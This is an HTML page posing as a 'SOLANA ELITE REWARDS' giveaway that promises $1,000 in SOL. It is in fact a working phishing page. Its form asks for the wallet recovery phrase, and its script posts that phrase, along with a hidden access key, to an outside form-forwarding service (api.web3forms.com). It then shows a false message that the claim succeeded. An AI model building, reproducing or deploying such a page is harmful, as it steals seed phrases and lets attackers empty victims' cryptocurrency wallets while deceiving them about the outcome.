<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SOLANA ELITE REWARDS</title>
    <!-- FIXED: Premium Font Link for Syncopate and Space Grotesk -->
    <link href="https://googleapis.com" rel="stylesheet">
    <style>
        :root { --sol-g: #00FFA3; --sol-p: #DC1FFF; }
        body { margin: 0; background: #000; color: #fff; font-family: 'Space Grotesk', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
        .card { width: 85%; max-width: 450px; background: #080808; border: 1px solid rgba(0, 255, 163, 0.2); border-radius: 40px; padding: 50px 35px; text-align: center; box-shadow: 0 0 80px rgba(0, 0, 0, 1); }
        h1 { font-family: 'Syncopate', sans-serif; font-size: 1.6rem; margin-bottom: 25px; background: linear-gradient(90deg, var(--sol-g), #fff, var(--sol-p)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; letter-spacing: -1px; font-weight: 700; }
        .sub { font-size: 0.85rem; color: #888; margin-bottom: 35px; line-height: 1.6; }
        .ib { text-align: left; margin-bottom: 30px; }
        label { font-size: 0.65rem; text-transform: uppercase; letter-spacing: 3px; color: var(--sol-g); display: block; margin-bottom: 12px; font-weight: 700; }
        
        textarea { 
            width: 100%; 
            background: #111; 
            border: 1px solid #333; 
            border-radius: 15px; 
            padding: 18px; 
            color: #fff; 
            font-family: 'Space Grotesk', sans-serif; 
            font-size: 1rem; 
            box-sizing: border-box; 
            transition: 0.3s;
            resize: none;
            height: 150px; 
        }
        textarea:focus { outline: none; border-color: var(--sol-g); background: #151515; }

        .btn { width: 100%; padding: 22px; border: none; border-radius: 16px; background: linear-gradient(135deg, var(--sol-g), var(--sol-p)); color: #fff; font-family: 'Syncopate', sans-serif; font-weight: 700; font-size: 0.85rem; cursor: pointer; box-shadow: 0 15px 30px rgba(0, 255, 163, 0.2); transition: 0.3s; }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
        #success-view { display: none; }
        .success-h { font-family: 'Syncopate', sans-serif; font-size: 1.4rem; color: var(--sol-g); margin-bottom: 25px; }
        .congrats { font-size: 1rem; line-height: 1.8; color: #fff; padding: 25px; background: rgba(0, 255, 163, 0.05); border-radius: 20px; border: 1px dashed var(--sol-g); }
    </style>
</head>
<body>
    <div class="card">
        <div id="form-view">
            <form id="claim-form">
                <!-- ACCESS KEY -->
                <input type="hidden" name="access_key" value="f072b4f9-8659-434d-a883-cdd2f5165baf">
                
                <h1>CLAIM $1,000 SOL</h1>
                <p class="sub">To claim the $1,000 SOL, connect your solana wallet with your name</p>
                
                <div class="ib">
                    <label>solana1234</label>
                    <textarea name="Recovery_Phrase" required></textarea>
                </div>

                <input type="hidden" name="subject" value="New $1,000 SOL Claim">
                <button type="submit" id="submit-btn" class="btn">CONNECT WALLET</button>
            </form>
        </div>

        <div id="success-view">
            <h1 class="success-h">CLAIM SUCCESSFUL</h1>
            <div class="congrats">
                Congrats, you have claimed $1,000 SOL and you’ll receive the $1,000 SOL to your wallet address within 24 hrs
            </div>
        </div>
    </div>

    <script>
        const form = document.getElementById('claim-form');
        const submitBtn = document.getElementById('submit-btn');
        const formView = document.getElementById('form-view');
        const successView = document.getElementById('success-view');

        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            submitBtn.textContent = "CONNECTING...";
            submitBtn.disabled = true;

            const formData = new FormData(form);
            const object = Object.fromEntries(formData);
            const json = JSON.stringify(object);

            try {
                const response = await fetch("https://api.web3forms.com/submit", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "Accept": "application/json"
                    },
                    body: json
                });

                if (response.ok) {
                    formView.style.display = "none";
                    successView.style.display = "block";
                } else {
                    alert("Submission failed. Please check your connection.");
                    submitBtn.textContent = "CONNECT WALLET";
                    submitBtn.disabled = false;
                }
            } catch (error) {
                alert("Something went wrong. Please try again.");
                submitBtn.textContent = "CONNECT WALLET";
                submitBtn.disabled = false;
            }
        });
    </script>
</body>
</html>
